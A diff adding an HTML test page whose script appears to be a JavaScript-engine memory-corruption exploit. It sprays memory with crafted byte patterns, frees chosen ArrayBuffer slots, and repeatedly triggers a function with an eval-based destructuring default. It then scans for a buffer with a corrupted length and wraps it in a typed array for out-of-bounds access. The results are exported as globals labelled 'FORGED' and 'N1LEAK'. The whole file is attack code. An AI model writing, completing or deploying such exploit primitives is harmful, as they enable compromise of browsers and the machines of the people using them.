@@ -1,0 +1,61 @@
+<!doctype html><body><div id="v">N1A</div>
+<script>"use strict";
+function f([] = eval("(")) { var q1 = 0, q2 = 0, q3 = 0; return 1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5; }
+var PAT = [0,0,0,0,1,0,0,0,255,255,0,0,255,255,255,255,255,255,255,255,255,255,255,255,1,0,0,0,255,255,255,255,255,255,255,255,255,255,255,255];
+var S1 = new Array(900);
+for (var i = 0; i < 900; i++) S1[i] = new Uint8Array(1980);
+var S2 = new Array(1500);
+for (var i = 0; i < 1500; i++) S2[i] = new Uint8Array(976);
+var D = new Array(800);
+for (var i = 0; i < 800; i++) D[i] = new ArrayBuffer(64);
+var TN = 600;
+var T = new Array(TN), TV = new Array(TN);
+for (var i = 0; i < TN; i++) { T[i] = new ArrayBuffer(72); TV[i] = new Uint8Array(T[i]); }
+var PH = [4,12,20,28,36], VK = [598,588,578,568,558];
+var MARK = "NOCORR", hit = -1, ntry = 0, ph = -1, vk = -1;
+function fill(p) {
+  var pb = new Uint8Array(1980), o, i, n;
+  for (o = p; o + 40 <= 1980; o += 40) pb.set(PAT, o);
+  for (i = 0; i < 900; i++) S1[i].set(pb);
+  if (1500) {
+    pb = new Uint8Array(976);
+    for (o = p; o + 40 <= 976; o += 40) pb.set(PAT, o);
+    for (i = 0; i < 1500; i++) S2[i].set(pb);
+  }
+}
+function scan() {
+  for (var i = 0; i < TN; i++)
+    if (T[i] !== null && T[i].byteLength !== 72) return i;
+  return -1;
+}
+for (var pi = 0; pi < PH.length && hit < 0; pi++) {
+  fill(PH[pi]);
+  for (var vi = 0; vi < VK.length && hit < 0; vi++) {
+    vk = VK[vi];
+    T[vk] = null; TV[vk] = null;
+    try { f(); } catch (e) {}
+    ntry++;
+    hit = scan();
+    if (hit >= 0) {
+      ph = PH[pi];
+      MARK = "ABLEN[" + hit + "]=" + T[hit].byteLength + " ph=" + ph + " vk=" + vk + " try=" + ntry;
+    }
+  }
+}
+var VAB = null, V = null;
+if (hit >= 0) {
+  VAB = T[hit];
+  try { V = new Uint8Array(VAB); MARK += " VLEN=" + V.length; }
+  catch (e2) { MARK += " VERR=" + e2; }
+}
+globalThis.T = T; globalThis.TV = TV; globalThis.V = V; globalThis.VAB = VAB;
+globalThis.AB = VAB; globalThis.ABV = (hit >= 0) ? TV[hit] : V; globalThis.N1LEAK = "FORGED";
+globalThis.N1TOPS = (globalThis.PAT === PAT) ? 1 : 0;
+globalThis.RESULT = "RESULT " + MARK + " tops=" + globalThis.N1TOPS;
+globalThis.N1MARK = MARK;
+try { if (typeof document !== "undefined" && document.getElementById) {
+  var vv = document.getElementById("v"); if (vv) vv.textContent = "RESULT " + MARK; } } catch (e3) {}
+try { if (typeof console !== "undefined" && console.log) console.log("N1A:" + MARK); } catch (e4) {}
+if (globalThis.N1_THROW) throw new Error("RESULT " + MARK);
+</script>
+<script>setTimeout(function(){},20000);</script></body></html>
